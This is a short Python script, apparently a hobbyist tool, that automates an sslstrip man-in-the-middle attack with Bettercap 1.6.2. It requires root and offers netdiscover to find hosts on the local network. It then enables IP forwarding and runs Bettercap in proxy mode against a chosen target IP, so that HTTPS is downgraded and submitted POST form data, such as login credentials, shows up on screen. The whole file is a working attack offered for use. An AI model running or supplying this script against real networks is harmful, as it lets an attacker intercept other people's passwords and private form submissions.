# -*- coding: utf-8 -*-
from os import *
from time import sleep
import sys
normal = "\033[0m"
yesil = '\033[92m'
kirmizi = '\033[91m'
system("clear")
#izinler
if sys.version_info.major < 3:
    print(kirmizi+"Can only work Python3 !")
    exit()
if not getuid() == 0 :
    print(kirmizi,"Can only work 'root'")
    exit()
#izinler

print("Welcome to the Bettercap 1.6.2 automated sslstrip tool!\n")
print(kirmizi,"--Make sure the installed in Bettercap 1.6.2--",normal)
sleep(3)
while True:
    system("clear")
    print("""
    Explore the local network       : net
    Download the Bettercap 1.6.2    : download
    ---------------------------------------------------
    What's sslstrip ?

    sslstrip is a local network attack that prevents 
    web addresses that do not use hsts from connecting 
    to https from http.
    Also, if the attack is successful,
    the form information will appear on the screen.    
    ---------------------------------------------------
    Android :

    This program was written with amd64 architecture
    Kali Linux
    So it can work unstable (arm) for android
    For proper operation in Termux application;
    Android root access is a must.
    In programs using fake root, such as Userland
    interface will give error, will not work
    ----------------------------------------------------
    Contact or more informations sslstrip : @raif.py
    ----------------------------------------------------
    {}Usage ;{}

    Just enter the ip address of your destination on the
    local network .
    If you're not sure, verify by typing "net"
    
    example:
    192.168.1.100 [enter]
    Than sslstrip + sniff starts
    -----------------------------------------------------
    """.format(yesil,normal))

    a = input(yesil+"What shall we do :) \nA: "+normal)
    if a == "net":
        print("netdiscover opening . Press ctrl + c to exit")
        sleep(3)
        system("netdiscover")
    elif a == "download":
        system("apt-get install ruby -y && gem install bettercap")
    else:
        break
system("clear")
system('echo "1" > /proc/sys/net/ipv4/ip_forward')
print(yesil,"Starting !")
sleep(1)
system("bettercap -T {} --proxy -P POST".format(a))
print("Please report if you experience an error while using the program.")
